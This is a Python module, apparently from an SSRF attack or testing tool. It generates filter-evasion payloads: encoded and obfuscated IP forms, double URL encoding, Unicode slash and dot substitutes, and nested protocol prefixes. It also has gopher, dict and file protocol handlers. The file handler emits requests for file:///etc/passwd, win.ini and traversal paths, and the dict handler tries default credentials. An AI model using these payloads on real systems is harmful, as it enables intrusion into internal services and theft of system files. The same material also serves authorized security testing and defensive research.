"""Payload generation and protocol-specific payload handlers."""

import base64
import logging
import socket
from urllib.parse import quote


class PayloadGenerator:
    def __init__(self):
        self.ip_formats = ['decimal', 'hex', 'octal']
        self.url_encodings = ['single', 'double', 'base64']
        self.protocol_variations = ['standard', 'nested', 'mixed']

    def generate_ip_variations(self, ip):
        """Generate different IP format variations"""
        variations = set()  # Using set to avoid duplicates
        try:
            # Add original format
            variations.add(ip)
            
            # Handle special cases first
            if ip in ['localhost', 'internal', 'intranet']:
                variations.add(ip)
                variations.add('127.0.0.1')
                return list(variations)

            # Handle IPv6 addresses
            if ':' in ip:
                if '[' in ip:  # Bracketed IPv6
                    variations.add(ip)
                    variations.add(ip.strip('[]'))
                else:  # Regular IPv6
                    variations.add(ip)
                    variations.add(f'[{ip}]')
                return list(variations)

            # Handle domain names
            if any(c.isalpha() for c in ip):
                variations.add(ip)
                return list(variations)

            # Handle IPv4 addresses
            if '.' in ip:
                try:
                    # Standard IPv4 processing
                    parts = ip.split('.')
                    if len(parts) == 4:
                        # Original format
                        variations.add(ip)
                        
                        # Decimal format
                        try:
                            ipint = int.from_bytes(socket.inet_aton(ip), 'big')
                            variations.add(str(ipint))
                        except:
                            pass

                        # Hex format (per octet)
                        try:
                            hex_parts = [hex(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0x{part}" for part in hex_parts))
                        except:
                            pass

                        # Octal format (per octet)
                        try:
                            oct_parts = [oct(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0{part}" for part in oct_parts))
                        except:
                            pass

                        # Mixed format
                        try:
                            variations.add(f"{parts[0]}.{int(parts[1])}.{hex(int(parts[2]))[2:]}.{oct(int(parts[3]))[2:]}")
                        except:
                            pass

                except Exception as e:
                    logging.debug(f"Error processing IPv4 address {ip}: {str(e)}")

            # Handle hexadecimal format
            elif ip.startswith('0x'):
                try:
                    dec = int(ip[2:], 16)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)

            # Handle octal format
            elif ip.startswith('0'):
                try:
                    dec = int(ip, 8)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)

            # Add URL encoded variations for all generated IPs
            current_variations = variations.copy()
            for var in current_variations:
                variations.add(quote(var))
                variations.add(quote(quote(var)))

        except Exception as e:
            logging.debug(f"Error generating variations for {ip}: {str(e)}")
            variations.add(ip)  # Keep original IP if processing fails

        return list(variations)

    def generate_url_encodings(self, url):
        """Generate different URL encoding variations"""
        variations = set()
        try:
            # Original URL
            variations.add(url)
            
            # Single encode
            variations.add(quote(url))
            
            # Double encode
            variations.add(quote(quote(url)))
            
            # Base64
            variations.add(base64.b64encode(url.encode()).decode())
            
            # Mixed encoding
            variations.add(quote(url).replace('%', '%25'))
            
            # URL encoding variations
            variations.add(url.replace('.', '%2e'))
            variations.add(url.replace('/', '%2f'))
            
            # Unicode variations
            variations.add(url.replace('.', '。'))  # Unicode full stop
            variations.add(url.replace('/', '／'))  # Unicode forward slash
            
        except Exception as e:
            logging.debug(f"Error generating URL encodings for {url}: {str(e)}")
            variations.add(url)
        
        return list(variations)

    def generate_protocol_variations(self, protocol, payload):
        """Generate protocol-specific payload variations"""
        variations = set()
        try:
            # Standard protocol
            variations.add(f"{protocol}://{payload}")
            
            # Protocol with double slash variation
            variations.add(f"{protocol}:/{payload}")
            variations.add(f"{protocol}:///{payload}")
            
            # Nested protocols
            variations.add(f"{protocol}://{protocol}://{payload}")
            
            # Mixed case protocols
            variations.add(f"{protocol.upper()}://{payload}")
            variations.add(f"{protocol.title()}://{payload}")
            
            # URL encoded protocol
            variations.add(f"{quote(protocol)}://{payload}")
            
        except Exception as e:
            logging.error(f"Error generating protocol variations for {protocol}: {str(e)}")
        
        return list(variations)

class ProtocolHandler:
    def __init__(self):
        self.generator = PayloadGenerator()

    def handle_gopher(self, payload):
        """Handle Gopher protocol specific payloads"""
        variations = []
        try:
            # Standard gopher
            variations.append(f"gopher://{payload}")
            
            # Gopher with specific port
            variations.append(f"gopher://{payload}:70")
            
            # Gopher with subdirectories
            variations.append(f"gopher://{payload}/1")
            
            # URL encoded variations
            variations.extend(self.generator.generate_url_encodings(f"gopher://{payload}"))
            
        except Exception as e:
            logging.error(f"Error handling gopher protocol: {str(e)}")
        
        return variations

    def handle_dict(self, payload):
        """Handle Dict protocol specific payloads"""
        variations = []
        try:
            # Standard dict
            variations.append(f"dict://{payload}")
            
            # Dict with commands
            variations.append(f"dict://{payload}/d:password")
            variations.append(f"dict://{payload}/show:db")
            
            # Dict with auth attempts
            variations.append(f"dict://dict:dict@{payload}")
            
        except Exception as e:
            logging.error(f"Error handling dict protocol: {str(e)}")
        
        return variations

    def handle_file(self, payload):
        """Handle File protocol specific payloads"""
        variations = []
        try:
            # Standard file
            variations.append(f"file://{payload}")
            
            # Common file paths
            variations.append(f"file:///{payload}")
            variations.append(f"file:///etc/passwd")
            variations.append(f"file:///windows/win.ini")
            
            # Directory traversal combinations
            variations.append(f"file://../{payload}")
            variations.append(f"file:///./{payload}")
            
        except Exception as e:
            logging.error(f"Error handling file protocol: {str(e)}")
        
        return variations

